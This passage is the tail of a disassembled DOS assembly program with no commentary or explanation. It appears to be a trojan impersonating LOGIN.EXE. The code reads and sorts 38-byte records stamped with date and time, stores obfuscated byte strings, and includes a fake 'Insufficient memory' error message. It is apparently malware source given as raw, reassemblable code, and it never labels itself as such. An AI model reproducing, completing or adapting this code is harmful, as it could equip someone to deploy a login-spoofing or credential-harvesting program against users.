sub_14:		mov	al,2
		mov	cx,0FFFFh
		mov	dx,0FFFCh
		call	sub_5			;(0222)
		push	cs
		pop	ds
		mov	dx,0
		mov	cx,2
		call	sub_3			;(0216)
		mov	ax,ds:data_4e		;(8002:0000=0)
		cmp	ax,6262h
		jne	loc_61			;Jump if not equal
		mov	cx,10h

locloop_58:
		push	cx
		mov	ax,26h
		dec	cx
		mul	cx			;dx:ax = reg * ax
		mov	dx,0FD9Ch
		add	dx,ax
		mov	al,2
		mov	cx,0FFFFh
		call	sub_5			;(0222)
		mov	dx,0BE6h
		mov	cx,26h
		call	sub_3			;(0216)
		jc	loc_60			;Jump if carry Set
		cmp	byte ptr data_48,82h	;(8002:0BE6=0)
		jb	loc_59			;Jump if below
		call	sub_15			;(0979)
loc_59:
		pop	cx
		loop	locloop_58		;Loop if cx > 0

		jmp	short loc_60		;(095C)
		db	90h
loc_60:
		mov	al,2
		mov	cx,0FFFFh
		mov	dx,0FD9Ch
		call	sub_5			;(0222)
		mov	dx,981h
		mov	cx,263h
		nop
		call	sub_2			;(0212)
loc_61:
		mov	cs:data_56,0		;(8002:0C12=0)
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15:		call	sub_17			;(0A7A)
		cmp	cs:data_56,0Fh		;(8002:0C12=0)
		je	loc_64			;Jump if equal
		mov	si,981h
		mov	ax,26h
		mul	cs:data_56		;(8002:0C12=0) ax = data * ax
		add	si,ax
		mov	ax,cs:data_50		;(8002:0C06=0)
		cmp	cs:data_20e[si],ax	;(8002:0020=0)
		nop
		jc	loc_62			;Jump if carry Set
		mov	ax,cs:data_51		;(8002:0C08=0)
		cmp	cs:[si+22h],ax
		nop
		jc	loc_62			;Jump if carry Set
		mov	ax,cs:data_52		;(8002:0C0A=0)
		cmp	cs:[si+24h],ax
		nop
		ja	loc_ret_63		;Jump if above
loc_62:
		call	sub_18			;(0AB0)

loc_ret_63:
		retn
loc_64:
		mov	cs:data_57,0Fh		;(8002:0C14=0)
		mov	cs:data_53,0		;(8002:0C0C=0)
		mov	cs:data_54,0		;(8002:0C0E=0)
		mov	cs:data_55,0		;(8002:0C10=0)
loc_65:
		dec	cs:data_57		;(8002:0C14=0)
		jz	loc_62			;Jump if zero
		mov	si,981h
		mov	ax,26h
		mul	cs:data_57		;(8002:0C14=0) ax = data * ax
		add	ax,26h
		add	si,ax
		mov	ax,cs:data_20e[si]	;(8002:0020=0)
		or	ax,ax			;Zero ?
		jz	loc_67			;Jump if zero
		cmp	cs:data_53,ax		;(8002:0C0C=0)
		ja	loc_66			;Jump if above
		mov	ax,cs:data_51		;(8002:0C08=0)
		cmp	cs:[si+22h],ax
		nop
		jc	loc_66			;Jump if carry Set
		mov	ax,cs:data_52		;(8002:0C0A=0)
		cmp	cs:[si+24h],ax
		nop
		ja	loc_65			;Jump if above
loc_66:
		mov	ax,cs:data_57		;(8002:0C14=0)
		inc	ax
		mov	cs:data_56,ax		;(8002:0C12=0)
		mov	ax,cs:data_20e[si]	;(8002:0020=0)
		mov	cs:data_53,ax		;(8002:0C0C=0)
		mov	ax,cs:[si+22h]
		mov	cs:data_54,ax		;(8002:0C0E=0)
		mov	ax,cs:[si+24h]
		mov	cs:data_55,ax		;(8002:0C10=0)
		jmp	short loc_65		;(09D2)
loc_67:
		dec	cs:data_57		;(8002:0C14=0)
		jnz	loc_68			;Jump if not zero
		jmp	loc_62			;(09B2)
loc_68:
		mov	si,981h
		mov	ax,26h
		mul	cs:data_57		;(8002:0C14=0) ax = data * ax
		add	ax,26h
		add	si,ax
		mov	ax,cs:data_20e[si]	;(8002:0020=0)
		or	ax,ax			;Zero ?
		jz	loc_67			;Jump if zero
		mov	ax,cs:data_57		;(8002:0C14=0)
		inc	ax
		inc	ax
		mov	cs:data_56,ax		;(8002:0C12=0)
		jmp	loc_62			;(09B2)


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_16:		mov	ah,2Ah			;'*'
		call	sub_7			;(0229)
		mov	cs:data_50,cx		;(8002:0C06=0)
		mov	cs:data_51,dx		;(8002:0C08=0)
		mov	ah,2Ch			;','
		call	sub_7			;(0229)
		mov	cs:data_52,cx		;(8002:0C0A=0)
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_17:		push	cs
		pop	ax
		mov	es,ax
		mov	ds,ax
		mov	cs:data_56,0		;(8002:0C12=0)
loc_69:
		mov	di,981h
		mov	ax,26h
		mul	cs:data_56		;(8002:0C12=0) ax = data * ax
		add	di,ax
		mov	si,0BE6h
loc_70:
		mov	al,[si]
		cld				;Clear direction
		cmpsb				;Cmp [si] to es:[di]
		jnz	loc_71			;Jump if not zero
		cmp	al,6Fh			;'o'
		jne	loc_70			;Jump if not equal
		retn
loc_71:
		inc	cs:data_56		;(8002:0C12=0)
		cmp	cs:data_56,0Fh		;(8002:0C12=0)
		jne	loc_69			;Jump if not equal
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_18:		mov	ax,cs:data_56		;(8002:0C12=0)
		or	ax,ax			;Zero ?
		jz	loc_73			;Jump if zero
		mov	ax,26h
		mul	cs:data_56		;(8002:0C12=0) ax = data * ax
		mov	cx,ax
		add	ax,9A7h
		dec	ax
		mov	di,ax
		sub	ax,26h
		mov	si,ax
		std				;Set direction flag
		rep	movsb			;Rep when cx >0 Mov [si] to es:[di]
		mov	si,0BE6h
		mov	di,9A7h
		mov	cx,26h
loc_72:
		cld				;Clear direction
		rep	movsb			;Rep when cx >0 Mov [si] to es:[di]
		retn
loc_73:
		mov	si,0BF6h
		mov	di,991h
		mov	cx,16h
		jmp	short loc_72		;(0AD9)


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_19:		push	cs
		pop	ds
		mov	si,6Ah
		add	si,bx
		mov	di,6Ah
		mov	cx,0B7Bh
		rep	movsb			;Rep when cx >0 Mov [si] to es:[di]
		retn

		db	'LOGIN.EXE'
		db	0B5h, 0B7h, 0B2h, 0A7h, 0B4h, 0B8h
		db	0ABh, 0B5h, 0B1h, 0B4h, 6Fh, 0
		db	0, 0, 0, 0, 6Fh, 0A7h
		db	0B5h, 0AEh, 0B1h
		db	6Fh
		db	10 dup (0)
		db	0C7h, 7, 0Ah, 0Ch, 0Bh, 8
		db	32 dup (0)
		db	0C7h, 7, 0Bh, 9, 35h, 6
		db	'and', 0Dh, 0Ah, '$'
		db	0Dh, 0Ah, 'Insufficoent memory fo'
		db	'r '
		db	0C7h, 7, 11h, 6, 0, 0Eh
		db	0, 0
		db	112 dup (0)
timer_count	db	0
data_48		db	0
		db	15 dup (0)
data_49		db	0
		db	15 dup (0)
data_50		dw	0
data_51		dw	0
data_52		dw	0
data_53		dw	0
data_54		dw	0
data_55		dw	0
data_56		dw	0
data_57		dw	0
data_58		db	0
data_59		db	0
		db	329 dup (0)
		db	62h, 62h, 1, 0

newcom		ends
		end	start
